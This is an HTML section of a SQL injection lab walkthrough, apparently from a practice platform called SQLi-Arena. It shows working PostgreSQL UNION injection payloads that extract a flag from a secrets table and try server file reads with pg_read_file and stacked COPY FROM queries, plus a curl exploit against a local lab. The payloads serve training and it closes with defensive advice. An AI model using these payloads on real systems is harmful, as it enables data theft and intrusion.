<h4>Step 1: Test Normal Search and Confirm Injection</h4>
<p>
    Search for a product and confirm UNION injection works.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Column Count and UNION Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' ORDER BY 3 --<br>
        <span class="prompt">Result: </span>All 4 products shown in order (no error -- 3 columns confirmed)<br><br>
        <span class="prompt">Input: </span>' ORDER BY 4 --<br>
        <span class="prompt">Result: </span><strong>ERROR: ORDER BY position 4 is not in select list</strong><br><br>
        <span class="prompt">Input: </span>zzzzz' UNION SELECT 1, 'test', 'test' --<br>
        <span class="prompt">Output: </span><strong>ID:</strong> 1 &bull; <strong>Name:</strong> test &bull; <strong>Description:</strong> test
    </div>
</div>

<h4>Step 2: Extract the Flag via UNION</h4>
<p>
    Use UNION to pull the secret value from the <code>server_secrets</code> table.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Extract Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT id, secret_value, secret_value FROM server_secrets --<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 2 &bull; <strong>Name:</strong> SQL Tuning Handbook &bull; <strong>Description:</strong> Performance optimization techniques for SQL queries.<br>
        <strong>ID:</strong> 3 &bull; <strong>Name:</strong> Data Modeling 101 &bull; <strong>Description:</strong> Introduction to relational database design patterns.<br>
        <strong>ID:</strong> 1 &bull; <strong>Name:</strong> FLAG{pg_f1l3_r34d_c0py} &bull; <strong>Description:</strong> FLAG{pg_f1l3_r34d_c0py}<br>
        <strong>ID:</strong> 1 &bull; <strong>Name:</strong> PostgreSQL Admin Guide &bull; <strong>Description:</strong> Complete reference for PostgreSQL database administration.<br>
        <strong>ID:</strong> 4 &bull; <strong>Name:</strong> Backup Strategies &bull; <strong>Description:</strong> Best practices for PostgreSQL backup and recovery.
    </div>
</div>

<h4>Step 3: Read Server Files with pg_read_file() (Superuser Only)</h4>
<p>
    PostgreSQL's <code>pg_read_file()</code> function reads files from the server's filesystem.
    This requires <strong>superuser</strong> privileges.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3: pg_read_file() (Requires Superuser)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT 1, pg_read_file('/etc/hostname'), 'file_read' --<br>
        <span class="prompt">Error: </span><strong>PostgreSQL Error: ERROR: permission denied for function pg_read_file</strong><br><br>
        <span class="prompt">// </span>This error confirms the database user is NOT a superuser.<br>
        <span class="prompt">// </span>On a real engagement, if the user IS a superuser, this would show the file contents.
    </div>
</div>

<h4>Step 4: COPY FROM File (Superuser Only)</h4>
<p>
    The <code>COPY</code> command can import file contents into a table. Combined with stacked queries,
    you can create a temp table, copy a file into it, then SELECT from it.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. COPY FROM (Requires Superuser)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'; CREATE TEMP TABLE tmp_read(line TEXT); COPY tmp_read FROM '/etc/hostname'; --<br>
        <span class="prompt">Error: </span><strong>PostgreSQL Error: ERROR: permission denied to COPY from a file</strong><br><br>
        <span class="prompt">// </span>On a superuser account, this would succeed, then:<br>
        <span class="prompt">Input: </span>' UNION SELECT 1, line, 'from_file' FROM tmp_read --<br>
        <span class="prompt">// </span>Would show the file contents line by line.
    </div>
</div>

<h4>Step 5: Enumerate Server Configuration via pg_settings</h4>
<p>
    Even without superuser, you can query <code>pg_settings</code> to discover PostgreSQL
    configuration values and server information.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Enumerate pg_settings</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>zzzzz' UNION SELECT 1, name||'='||setting, 'x' FROM pg_settings LIMIT 3 --<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> recovery_target= &bull; <strong>Description:</strong> x<br>
        <strong>Name:</strong> geqo_seed=0 &bull; <strong>Description:</strong> x<br>
        <strong>Name:</strong> subtransaction_buffers=32 &bull; <strong>Description:</strong> x
    </div>
</div>

<p>
    <strong>Note:</strong> Sensitive settings like <code>config_file</code> and <code>hba_file</code>
    are only visible to superusers.
</p>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{pg_f1l3_r34d_c0py}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab7" \<br> --data-urlencode "search=' UNION SELECT id, secret_value, secret_value FROM server_secrets --"<br><br>
        <span class="prompt">Output (flag appears in Name column):</span><br>
        <strong>ID:</strong> 1 &bull; <strong>Name:</strong> FLAG{pg_f1l3_r34d_c0py} &bull; <strong>Description:</strong> FLAG{pg_f1l3_r34d_c0py}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PostgreSQL provides several functions for reading server files:
    <code>pg_read_file()</code>, <code>pg_read_binary_file()</code>, and <code>pg_ls_dir()</code>
    (all require superuser privileges). The <code>COPY ... FROM</code> command can also import file
    contents into tables (requires superuser or specific privileges). In this lab, the database user
    is NOT a superuser, so these functions are denied: but the flag was still extracted via UNION
    from the database table. On a real engagement, always check for superuser access.
    Defense: never run applications as PostgreSQL superuser, use parameterized queries with
    <code>pg_query_params()</code>, and restrict filesystem access.
</div>
